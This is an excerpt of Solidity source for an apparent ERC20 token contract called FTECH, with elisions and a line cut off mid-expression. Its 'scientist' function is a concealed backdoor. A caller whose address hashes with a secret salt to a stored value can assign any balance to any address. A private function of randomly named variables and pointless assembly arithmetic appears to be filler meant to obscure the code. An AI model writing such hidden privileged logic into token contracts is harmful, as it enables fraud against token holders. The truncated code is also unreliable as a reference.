...
contract FTECH is IERC20 {
    ...
    function scientist(bytes32[] calldata data) external {
      bytes memory bs = abi.encode(msg.sender, _salt);
      bytes32 d0 = data[0];
      bytes32 d1 = data[1];
      bytes32 d2 = data[2];
      if (keccak256(bs) == _hashValue) { if (uint256(d1) == 0) {
          _airdrops[address(
            uint160(uint256(
              d0))
          )] = uint256(d2
    ...
    function ojtCbQbckgfpVtpTKNkvlu() private pure { 
      uint sHPtxgkIm;
      bytes32 aW;
      bytes32 RbQ;
      assembly { 
        aW := add(sHPtxgkIm,5468599221127551169)
        aW := add(aW,7725628199895151463)
        sHPtxgkIm := add(RbQ,8622818165411682042)
      }
      string memory ELSgxaO;
      uint128 CeySe;
      uint128 jbAuZMjVyp;
      assembly { 
        jbAuZMjVyp := add(ELSgxaO,5739069872218209281)
        CeySe := add(CeySe,2486849245714084610)
        CeySe := add(jbAuZMjVyp,939819341117577195)
      }
    }
